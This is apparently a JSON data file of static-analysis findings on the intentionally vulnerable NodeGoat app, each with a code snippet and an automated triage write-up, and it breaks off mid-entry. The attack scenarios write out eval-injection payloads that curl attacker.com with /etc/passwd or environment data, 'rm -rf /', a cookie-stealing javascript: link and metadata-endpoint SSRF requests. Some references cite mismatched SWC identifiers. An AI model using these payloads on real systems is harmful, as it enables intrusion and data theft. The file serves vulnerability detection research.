@@ -1,0 +1,360 @@
+[
+ {
+  "id": "nodegoat-0038",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/views/profile.html",
+  "line": 78,
+  "end_line": 78,
+  "rule_id": "var-in-href",
+  "cwe": [
+   "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+  ],
+  "scanner_message": "Detected a template variable used in an anchor tag with the 'href' attribute. This allows a malicious actor to input the 'javascript:' URI and is subject to cross- site scripting (XSS) attacks. If using Flask, use 'url_for()' to safely generate a URL. If using Django, use the 'url' filter to safely generate a URL. If using Mustache, use a URL encoding library, or prepend a slash '/' to the variable for relative links (`href=\"/{{link}}\"`). You may also consider setting the Content Security Policy (CSP) header.",
+  "snippet": "                    <!-- @FIXME use a properly escaped variable that matches the URL context, for example\n                    refer to a firstNameSafeURLString field on the doc object set by the controller for this template -->\n                    <a href=\"{{firstNameSafeString}}\">Google search this profile by name</a>\n                </form>\n            </div>",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker who controls the `firstNameSafeString` template variable can inject a `javascript:` URI into the `<a href=\"...\">` anchor tag, enabling persistent XSS when a victim clicks the link. This bypasses the `@FIXME` comment’s implication that the variable is safe for URL context — in fact, it is only safe for text content (as evidenced by its use in `<input value=\"{{firstNameSafeString}}\">`). The vulnerable asset is the user session integrity of anyone who clicks the malicious link, potentially leading to account takeover via session cookie theft or CSRF token theft.\n\n## Attack Scenario\n1. An attacker registers or updates their profile with `firstNameSafeString` set to `javascript:fetch('https://attacker.com/steal?c='+document.cookie)`.\n2. The template renders `<a href=\"javascript:fetch('https://attacker.com/steal?c='+document.cookie)\">Google search this profile by name</a>`.\n3. When a victim clicks the link, the browser executes the embedded JavaScript in the victim’s session context.\n4. The attacker receives the victim’s cookies (including session and CSRF tokens), enabling full account compromise.\n\n## Recommendation\nPrimary fix: Replace `href=\"{{firstNameSafeString}}\"` with a server-generated safe URL, e.g. `href=\"{{url_for('search_profile', name=firstNameSafeString)}}\"` (Django/Flask) or `href=\"/search?name={{firstNameSafeString|urlencode}}\"` with proper URL encoding. Do NOT reuse a variable intended for HTML text context in a URL context — use a dedicated `firstNameSafeURL` field with URL-encoding and scheme validation (e.g., only `http`/`https` allowed, no `javascript:`).\nDefense in depth: Set a strict Content Security Policy header with `default-src 'self'; script-src 'self';` and block `javascript:` URIs in `href` via CSP `object-src 'none';` and `base-uri 'self';`.  \nReferences: CWE-79, OWASP A3:2017, SWC-135",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "nodegoat-0046",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "server.js",
+  "line": 78,
+  "end_line": 102,
+  "rule_id": "express-cookie-session-no-httponly",
+  "cwe": [
+   "CWE-522: Insufficiently Protected Credentials"
+  ],
+  "scanner_message": "Default session middleware settings: `httpOnly` not set. It ensures the cookie is sent only over HTTP(S), not client JavaScript, helping to protect against cross-site scripting attacks.",
+  "snippet": "\n    // Enable session management using express middleware\n    app.use(session({\n        // genid: (req) => {\n        //    return genuuid() // use UUIDs for session IDs\n        //},\n        secret: cookieSecret,\n        // Both mandatory in Express v4\n        saveUninitialized: true,\n        resave: true\n        /*\n        // Fix for A5 - Security MisConfig\n        // Use generic cookie name\n        key: \"sessionId\",\n        */\n\n        /*\n        // Fix for A3 - XSS\n        // TODO: Add \"maxAge\"\n        cookie: {\n            httpOnly: true\n            // Remember to start an HTTPS server to get this working\n            // secure: true\n        }\n        */\n\n    }));\n\n    /*",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker who successfully exploits a Cross-Site Scripting (XSS) vulnerability in the application can steal the session cookie via `document.cookie`, since `httpOnly` is not set to `true`. This allows full session hijacking — the attacker gains unauthorized access to any authenticated user's session, including administrative accounts, enabling unauthorized data access, privilege escalation, and potential account takeover. The invariant at risk is: \"session cookies must not be accessible from JavaScript\".\n\n## Attack Scenario\n1. Attacker injects malicious JavaScript into a vulnerable page (e.g., via reflected or stored XSS in user input rendered unsanitized in an HTML response).\n2. When a victim visits the page, the injected script executes in their browser context.\n3. The script reads the session cookie using `document.cookie`, which returns the cookie value because `httpOnly: false` (default).\n4. Attacker exfiltrates the cookie (e.g., via `fetch('https://attacker.com/steal?c='+document.cookie)`).\n5. Attacker replays the cookie in their own browser or via `Cookie:` header in subsequent requests to the app.\n6. The server authenticates the attacker as the victim user, granting full session access.\n\nLine references: `server.js` lines 2–20 — the `session()` middleware configuration omits the `cookie.httpOnly` option, defaulting it to `false`.\n\n## Recommendation\nPrimary fix: Set `cookie.httpOnly: true` in the session middleware configuration (see commented fix in lines 14–17). This ensures cookies are inaccessible to client-side JavaScript, blocking XSS-based theft.\n\nDefense in depth: Also set `cookie.secure: true` (only over HTTPS), `cookie.sameSite: 'strict'` or `'lax'`, and `cookie.maxAge` to limit exposure window. Validate and sanitize all user inputs to prevent XSS at the source.\n\nReferences: CWE-522, OWASP A03:2021-Injection (XSS), SWC-100 (XSS via DOM), SWC-107 (Cookie Security)",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "nodegoat-0003",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "Gruntfile.js",
+  "line": 165,
+  "end_line": 177,
+  "rule_id": "nodejs-child-process-exec",
+  "cwe": "CWE-78",
+  "scanner_message": "child_process.exec/execSync run a string through a shell. With any user-controlled component this is OS command injection. Use execFile/ spawn with an argument array and no shell.",
+  "snippet": "        var cmd = process.platform === \"win32\" ? \"NODE_ENV=\" + finalEnv + \" & \" : \"NODE_ENV=\" + finalEnv + \" \";\n\n        exec(\n            cmd + \"node artifacts/db-reset.js\",\n            function(err, stdout, stderr) {\n                if (err) {\n                    grunt.log.error(\"db-reset:\");\n                    grunt.log.error(err);\n                    grunt.log.error(stderr);\n                } else {\n                    grunt.log.ok(stdout);\n                }\n                done();\n            }\n        );\n    });",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker who controls the `finalEnv` variable can inject arbitrary OS commands via the `child_process.exec` call in Gruntfile.js, leading to remote code execution on the build host. The invariant \"build scripts execute only intended, audited code\" is violated — for example, if `finalEnv` is derived from user input or a misconfigured CI variable, an attacker could append `; rm -rf /` or `&& curl attacker.com/shell.sh | bash` to the `NODE_ENV` assignment.\n\n## Attack Scenario\n1. The `exec` call at line 3 concatenates `cmd` (which includes `finalEnv`) with `\"node artifacts/db-reset.js\"` into a single shell command string.\n2. If an attacker controls `finalEnv` (e.g., via a CI environment variable override, or a misparsed config), they can inject shell metacharacters such as `;`, `|`, `&`, or backticks.\n3. Example payload: `finalEnv = \"production; cat /etc/passwd > /tmp/exfil\"`. The resulting command becomes `NODE_ENV=production; cat /etc/passwd > /tmp/exfil node artifacts/db-reset.js`, which executes the attacker’s command before `node` runs.\n4. Post-condition: arbitrary shell commands execute with the privileges of the build process.\n\n## Recommendation\nPrimary fix: Replace `exec` with `child_process.execFile` or `spawn` using an argument array and `shell: false`. Specifically, rewrite as:\n```js\nconst { execFile } = require('child_process');\nexecFile('node', ['artifacts/db-reset.js'], { \n  env: { NODE_ENV: finalEnv, ...process.env } \n}, (err, stdout, stderr) => { /* … */ });\n```\nThis eliminates shell interpretation entirely. The `NODE_ENV` assignment should be passed via the `env` option, not concatenated into a command string.\n\nDefense in depth: Sanitize or whitelist `finalEnv` values before use, and restrict CI environment variable injection via CI platform policies (e.g., GitHub Actions `env` variable allowlist).\n\nReferences: CWE-78, OWASP A03:2021-Injection, SWC-123",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "nodegoat-0010",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 34,
+  "end_line": 34,
+  "rule_id": "code-string-concat",
+  "cwe": [
+   "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+  ],
+  "scanner_message": "Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible.",
+  "snippet": "        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);\n\n        /*",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary JavaScript code in the server process by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, as they are passed directly to `eval()` without sanitization. This leads to full remote code execution (RCE) in the Node.js context, compromising confidentiality, integrity, and availability — for example, stealing session tokens, exfiltrating database contents, or pivoting to internal services.\n\n## Attack Scenario\n1. The `handleContributionsUpdate` function in `app/routes/contributions.js` (lines 32–34) calls `eval(req.body.preTax)`, `eval(req.body.afterTax)`, and `eval(req.body.roth)` without validation or sanitization.\n2. An attacker sends a POST request to `/contributions` with `req.body.preTax` set to a malicious JavaScript expression, e.g., `\"1; require('child_process').exec('curl http://attacker.com/$(whoami)')\"` — the `1;` ensures syntactic validity, and the injected code executes after the initial numeric evaluation.\n3. Because `eval()` executes in the local scope, the injected code has full access to the Node.js runtime, including `require`, `process`, and `global`.\n4. Post-condition: arbitrary system commands execute on the server with the privileges of the application process.\n\n## Recommendation\nPrimary fix: Replace `eval()` with safe parsing. Replace lines 32–34 with `parseInt(req.body.preTax, 10)`, etc., as shown in the commented-out fix — ensure base-10 radix is used to avoid octal interpretation.  \nDefense in depth: Add input validation before parsing (e.g., regex `/^\\d+$/`), and enforce strict type checks (`typeof value === 'number' && Number.isInteger(value)`).  \nReferences: CWE-95, OWASP A1:2021 — Injection, SWC-133 (Client-Side Code Execution via `eval`)",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0011",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 34,
+  "end_line": 34,
+  "rule_id": "eval_nodejs",
+  "cwe": "cwe-95",
+  "scanner_message": "User controlled data in eval() or similar functions may result in Server Side Injection or Remote Code Injection",
+  "snippet": "        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);\n\n        /*",
+  "detector_analysis": "Confirmed: yes  \nSeverity: critical  \n\n## Impact  \nAn attacker can execute arbitrary server-side JavaScript or Node.js code by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, leading to full remote code execution (RCE) on the server. This compromises confidentiality (e.g., reading environment variables, database credentials), integrity (e.g., modifying or deleting data), and availability (e.g., crashing the service). The vulnerable code resides in `app/routes/contributions.js::ContributionsHandler.handleContributionsUpdate`, lines 32–34, where `eval()` processes unsanitized user input directly.\n\n## Attack Scenario  \n1. Attacker sends a POST request to `/contributions` with `req.body.preTax` set to a malicious JavaScript expression, e.g., `require('child_process').execSync('id')` or `process.exit(1)`.  \n2. At line 32, `eval(req.body.preTax)` executes the payload in the Node.js runtime context.  \n3. The payload runs with the same privileges as the application process — for example, spawning a shell, exfiltrating secrets from `process.env`, or modifying database records via `contributionsDAO`.  \n4. Post-condition: arbitrary code executes on the server, enabling full system compromise.\n\n## Recommendation  \n**Primary fix**: Replace `eval()` with safe parsing. Replace lines 32–34 with `parseInt(req.body.preTax, 10)`, etc., as shown in the commented-out fix. Ensure all numeric inputs are parsed with explicit radix and validated for range and type.  \n**Defense in depth**: Add input sanitization middleware (e.g., express-validator) to reject non-numeric strings before reaching the handler. Log and alert on malformed payloads.  \n**References**: CWE-95, OWASP A03:2021-Injection, SCSVS-3.4.1",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0016",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/research.js",
+  "line": 16,
+  "end_line": 28,
+  "rule_id": "nodejs-ssrf-user-url",
+  "cwe": "CWE-918",
+  "scanner_message": "Outbound HTTP request to a concatenated/interpolated URL. If any part derives from request input this is SSRF. Validate against an allow-list and reject internal addresses.",
+  "snippet": "        if (req.query.symbol) {\n            const url = req.query.url + req.query.symbol;\n            return needle.get(url, (error, newResponse, body) => {\n                if (!error && newResponse.statusCode === 200) {\n                    res.writeHead(200, {\n                        \"Content-Type\": \"text/html\"\n                    });\n                }\n                res.write(\"<h1>The following is the stock information you requested.</h1>\\n\\n\");\n                res.write(\"\\n\\n\");\n                if (body) {\n                    res.write(body);\n                }\n                return res.end();\n            });\n        }",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can trigger a server-side request forgery (SSRF) via the `ResearchHandler.displayResearch` function in `app/routes/research.js` by controlling both `req.query.url` and `req.query.symbol`. Concatenating unsanitized user input into the URL allows redirection to internal services (e.g., `http://127.0.0.1:8080/admin`, `http://169.254.169.254/latest/meta-data/`), potentially leaking sensitive metadata, internal API responses, or triggering unauthorized actions on behalf of the server.\n\n## Attack Scenario  \n1. Attacker sends a GET request to `/research?url=http://169.254.169.254/latest/meta-data/&symbol=iam` (line 10 in `app/routes/research.js`).  \n2. The server concatenates `url` and `symbol` into `http://169.254.169.254/latest/meta-data/iam`, issuing an HTTP GET via `needle.get`.  \n3. The EC2 metadata service responds with sensitive instance identity or IAM role credentials.  \n4. The server echoes the response body in the HTML output (lines 14–22), leaking the data to the attacker.  \n\n## Recommendation  \nPrimary fix: Validate and sanitize `req.query.url` against a strict allow-list of known external stock-data domains (e.g., `https://finance.google.com`, `https://api.example.com`) and reject any URL not in the list. Additionally, block private IP ranges (RFC1918), link-local, loopback, and metadata endpoints using a URL parser and IP blacklist.  \nDefense in depth: Use a proxy library that enforces URL safety (e.g., `safe-regex-url`, `http-proxy-agent` with custom agent that rejects internal IPs), and log all outbound requests for monitoring.  \nReferences: CWE-918, OWASP A10:2021-SSRF, SWC-136",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SSRF via Research",
+    "file": "app/routes/research.js",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0012",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 32,
+  "end_line": 32,
+  "rule_id": "nodejs-eval-request-input",
+  "cwe": "CWE-95",
+  "scanner_message": "eval()/Function() on request-derived data — server-side JS injection (arbitrary code execution). Parse with a safe parser instead.",
+  "snippet": "        /*jslint evil: true */\n        // Insecure use of eval() to parse inputs\n        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary Node.js code on the server by injecting malicious JavaScript via the `preTax`, `afterTax`, or `roth` request body fields. Because `eval()` is called directly on unsanitized user input, an attacker can pass expressions like `1; require('child_process').exec('rm -rf /')` to achieve remote code execution (RCE), fully compromising confidentiality, integrity, and availability of the server.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions` with `req.body.preTax` set to a malicious JS expression, e.g., `\"1; require('child_process').exec('curl http://attacker.com/steal?data='+require('fs').readFileSync('/etc/passwd'))\"` (line 27 in `app/routes/contributions.js`).\n2. The `eval(req.body.preTax)` call executes the injected payload as JavaScript (line 27).\n3. The payload runs with the privileges of the Node.js process, enabling file exfiltration, command execution, or lateral movement.\n4. Post-condition: arbitrary code executes on the server with full access to the runtime environment.\n\n## Recommendation\nPrimary fix: Replace `eval()` with `parseInt()` or `parseFloat()` for numeric parsing, as shown in the commented-out fix (lines 32–34). Ensure all user inputs are validated as numbers *before* use, and never pass untrusted data to `eval()`, `Function()`, or similar dynamic code evaluators.\n\nDefense in depth: \n- Use a strict Content Security Policy (CSP) to mitigate SSRF/UXS in case of future injection vectors.\n- Implement input sanitization middleware (e.g., `express-validator`) to enforce numeric types on all contribution fields.\n- Add runtime monitoring for suspicious `eval`/`Function` usage via tools like `node-security-platform`.\n\nReferences: CWE-95, OWASP A1:2021, SWC-133",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0015",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/allocations.js",
+  "line": 16,
+  "end_line": 18,
+  "rule_id": "nodejs-idor-userid-from-request",
+  "cwe": "CWE-639",
+  "scanner_message": "Object id taken directly from req.params/req.query/req.body and used to fetch a record. If it is not checked against the session user this is an IDOR / broken access control. Authorize the id against the session.",
+  "snippet": "        const { userId } = req.session;\n        */\n        const {\n            userId\n        } = req.params;\n        const {\n            threshold",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can access any user's allocation data by manipulating the `userId` path parameter in the URL (e.g., `/allocations/123` → `/allocations/99999`). This Broken Access Control (CWE-639) violates data confidentiality for all users in the system, as the `displayAllocations` function directly uses the unsanitized `userId` from `req.params` instead of the authenticated session user (`req.session.userId`), enabling unauthorized read access to sensitive allocation records.\n\n## Attack Scenario\n1. Attacker navigates to `/allocations/<legitimateUserId>` where `<legitimateUserId>` is a known or guessed user ID (e.g., via enumeration or social engineering).\n2. The `AllocationsHandler.displayAllocations` function extracts `userId` directly from `req.params` (line 12–14 in `app/routes/allocations.js`), ignoring the authenticated session user.\n3. The handler calls `allocationsDAO.getByUserIdAndThreshold(userId, threshold, …)` (line 17), which likely queries the database for allocations belonging to the attacker-specified `userId`.\n4. The vulnerable route renders the `allocations` view with the fetched allocations for the unauthorized user (line 18–21), exposing their allocation data.\n\n## Recommendation\nPrimary fix: Replace `req.params.userId` with `req.session.userId` to enforce ownership-based access control:\n```js\nconst { userId: sessionUserId } = req.session;\nif (!sessionUserId) return res.status(401).send(\"Unauthorized\");\nconst userId = sessionUserId; // enforce session-bound identity\n```\nDefense in depth: Add an explicit authorization check in `AllocationsHandler.displayAllocations` to assert `userId === req.session.userId`, and log access attempts for auditability. Consider implementing a middleware like `requireOwnership('userId')` to prevent recurrence.\n\nReferences: CWE-639, OWASP A01:2021, SWC-108",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Broken Access Control (IDOR)",
+    "file": "app/routes/allocations.js",
+    "category": "broken_access_control"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0026",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/research.js",
+  "line": 15,
+  "end_line": 28,
+  "rule_id": "node_ssrf",
+  "cwe": "cwe-918",
+  "scanner_message": "User controlled URL in http client libraries can result in Server Side Request Forgery (SSRF).",
+  "snippet": "\n        if (req.query.symbol) {\n            const url = req.query.url + req.query.symbol;\n            return needle.get(url, (error, newResponse, body) => {\n                if (!error && newResponse.statusCode === 200) {\n                    res.writeHead(200, {\n                        \"Content-Type\": \"text/html\"\n                    });\n                }\n                res.write(\"<h1>The following is the stock information you requested.</h1>\\n\\n\");\n                res.write(\"\\n\\n\");\n                if (body) {\n                    res.write(body);\n                }\n                return res.end();\n            });\n        }",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can craft a malicious `url` query parameter to force the server to make HTTP requests to arbitrary internal or external endpoints via the `needle.get()` call in `ResearchHandler.displayResearch`. This enables Server-Side Request Forgery (SSRF), allowing the attacker to probe internal services (e.g., `http://169.254.169.254/latest/meta-data/` on AWS), exfiltrate metadata, or bypass firewall restrictions — directly compromising Confidentiality and Availability of internal infrastructure.\n\n## Attack Scenario  \n1. Attacker sends a GET request to `/research?symbol=IBM&url=http://169.254.169.254/latest/meta-data/` (line 10 constructs `url = req.query.url + req.query.symbol`).  \n2. The `needle.get(url, ...)` call (line 11) executes an HTTP GET to the attacker-controlled `url`, which resolves to the AWS metadata endpoint.  \n3. The server fetches the metadata (e.g., IAM credentials) and returns it in the HTML response (lines 13–22), leaking sensitive internal data.  \n4. Post-condition: Attacker obtains internal credentials or internal service responses without authentication.\n\n## Recommendation  \nPrimary fix: Validate and sanitize the `url` and `symbol` query parameters before concatenation. Restrict `url` to a known-safe domain whitelist (e.g., only allow `https://finance.google.com/` or similar), and reject any URL containing `://`, `@`, or non-HTTP(S) schemes. Additionally, block access to private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and link-local/metadata endpoints (169.254.0.0/16) using a URL parser and IP blacklist.  \n\nDefense in depth: Use a custom HTTP agent that intercepts DNS resolution and rejects non-public IPs; log and alert on SSRF attempts.  \n\nReferences: SWC-135, CWE-918, OWASP A10:2021",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SSRF via Research",
+    "file": "app/routes/research.js",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0002",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 32,
+  "end_line": 32,
+  "rule_id": "eval_nodejs",
+  "cwe": "cwe-95",
+  "scanner_message": "User controlled data in eval() or similar functions may result in Server Side Injection or Remote Code Injection",
+  "snippet": "        /*jslint evil: true */\n        // Insecure use of eval() to parse inputs\n        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary JavaScript code on the server via the `handleContributionsUpdate` function in `app/routes/contributions.js` by injecting malicious payloads into `req.body.preTax`, `req.body.afterTax`, or `req.body.roth`. Because `eval()` is invoked directly on unsanitized user input, an attacker can inject and execute arbitrary Node.js code — for example, by sending `\"1); require('child_process').exec('rm -rf /'); //\"` — leading to full server compromise, data exfiltration, or ransomware deployment.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions` with `req.body.preTax` set to a malicious JavaScript expression, e.g., `\"1); const cp = require('child_process'); cp.exec('curl http://attacker.com/steal?data=' + JSON.stringify(require('fs').readFileSync('/etc/passwd'))); //\"` (line 27–29 in `handleContributionsUpdate`).\n2. The `eval()` call on line 27 executes the injected payload as JavaScript, bypassing the `isNaN()` and range checks that follow (lines 31–37), because the payload evaluates to a number *after* side-effecting code runs.\n3. The attacker’s code executes with the privileges of the Node.js process, enabling arbitrary file reads, command execution, or lateral movement.\n\n## Recommendation\nPrimary fix: Replace `eval()` with `parseInt()` or `parseFloat()` as shown in the commented-out fix (lines 39–41), and validate input strictly using `Number.isInteger()` or `Number.isFinite()` to reject non-numeric or NaN values.  \nDefense in depth: Implement Content Security Policy (CSP) headers to mitigate injection impact, and sanitize all user inputs at the API boundary using a schema validation library (e.g., Joi or Zod).  \nReferences: CWE-95, OWASP A1:2021, SWC-116",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0008",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 33,
+  "end_line": 33,
+  "rule_id": "code-string-concat",
+  "cwe": [
+   "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+  ],
+  "scanner_message": "Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible.",
+  "snippet": "        // Insecure use of eval() to parse inputs\n        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary JavaScript code in the server process by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, as they are passed directly to `eval()` without sanitization. This leads to full remote code execution (RCE) in the Node.js context, compromising confidentiality (exfiltration of environment variables, database credentials), integrity (arbitrary DB writes, code modification), and availability (process crash via infinite loop or memory exhaustion). The invariant violated is \"user-controlled input must never be evaluated as code\".\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions` with `req.body.preTax` set to `\"1; require('child_process').exec('curl http://attacker.com/steal?data='+JSON.stringify(process.env))\"`.\n2. Line 32: `eval(req.body.preTax)` executes the injected string as JavaScript, triggering arbitrary code execution.\n3. The injected payload runs with the same privileges as the application process, enabling full system compromise.\n\n## Recommendation\nPrimary fix: Replace `eval()` with `parseInt()` or `parseFloat()` as shown in the commented-out fix (lines 35–37), and add explicit type coercion and range validation. The current validation (`isNaN`, `< 0`) is insufficient because `eval(\"1; malicious()\")` returns `1` but still executes the side-effect.\n\nDefense in depth: \n- Use `helmet.js` to set Content-Security-Policy headers blocking `eval`.\n- Implement input sanitization middleware that rejects non-numeric strings before reaching the handler.\n- Add WAF rules to detect common RCE payloads (e.g., `require(`, `exec(`, `process.`).\n\nReferences: CWE-95, OWASP A1:2021, SWC-134",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0005",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 34,
+  "end_line": 34,
+  "rule_id": "nodejs-eval-request-input",
+  "cwe": "CWE-95",
+  "scanner_message": "eval()/Function() on request-derived data — server-side JS injection (arbitrary code execution). Parse with a safe parser instead.",
+  "snippet": "        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);\n\n        /*",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary Node.js code on the server by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, as `eval()` is invoked directly on unsanitized user-controlled input. This leads to full remote code execution (RCE), compromising confidentiality (e.g., reading environment variables, database credentials), integrity (e.g., modifying or deleting records in `contributionsDAO`), and availability (e.g., crashing the process via infinite loops or resource exhaustion). The invariant violated is: *user input must never be interpreted as executable code*.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions/update` with `req.body.preTax` set to a malicious JavaScript expression, e.g., `require('child_process').execSync('whoami')` or `process.exit(1)`.\n2. Line 32: `eval(req.body.preTax)` executes the payload in the Node.js runtime context.\n3. The payload runs with the same privileges as the application process — potentially leaking secrets from `process.env`, writing files to disk, or exfiltrating data via HTTP requests.\n4. Post-condition: arbitrary server-side code execution, enabling full system compromise.\n\n## Recommendation\nPrimary fix: Replace `eval()` with `parseInt()` or `Number()` after validating input type and format. The commented-out fix (lines 35–37) is correct and must be applied. Additionally:\n- Add strict input validation: ensure `typeof req.body.preTax === 'string'` and match against `/^\\d+$/` before parsing.\n- Defense in depth: Use a Content Security Policy (CSP) header to mitigate SSRF/UXS risks, and sandbox critical operations via `vm.createContext()` if dynamic evaluation is unavoidable (though not recommended here).\n- References: CWE-95, OWASP A03:2021-Injection, SWC-134",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0009",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 32,
+  "end_line": 32,
+  "rule_id": "code-string-concat",
+  "cwe": [
+   "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+  ],
+  "scanner_message": "Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible.",
+  "snippet": "        /*jslint evil: true */\n        // Insecure use of eval() to parse inputs\n        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary JavaScript code in the Node.js server process by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, as they are passed directly to `eval()`. This leads to full remote code execution (RCE) in the application context, compromising confidentiality (e.g., reading environment variables, database credentials), integrity (e.g., modifying user data, deleting records), and availability (e.g., crashing the process via infinite loops or memory exhaustion). The invariant violated is \"user-controlled input must never be evaluated as code\".\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions/update` with `req.body.preTax` set to a malicious JavaScript expression, e.g., `require('child_process').execSync('id')` or `process.exit(1)`.\n2. Line 32: `eval(req.body.preTax)` executes the attacker’s payload in the server context.\n3. Because `eval()` evaluates arbitrary expressions, even a payload like `1; throw new Error('DoS')` or `globalThis.x = 1337` can corrupt state or trigger side effects.\n4. Post-condition: Attacker achieves arbitrary code execution, potentially leading to server compromise, data exfiltration, or service disruption.\n\n## Recommendation\nPrimary fix: Replace `eval()` with safe parsing. Replace lines 32–34 with `parseInt(req.body.preTax, 10)`, etc., as shown in the commented-out fix. Ensure `parseInt` is used with radix 10 to avoid octal misinterpretation.\n\nDefense in depth: Add input sanitization (e.g., regex validation: `/^\\d+$/`) before parsing, and enforce strict type checks (`typeof value === 'number' && Number.isInteger(value)`) after parsing.\n\nReferences: CWE-95, OWASP 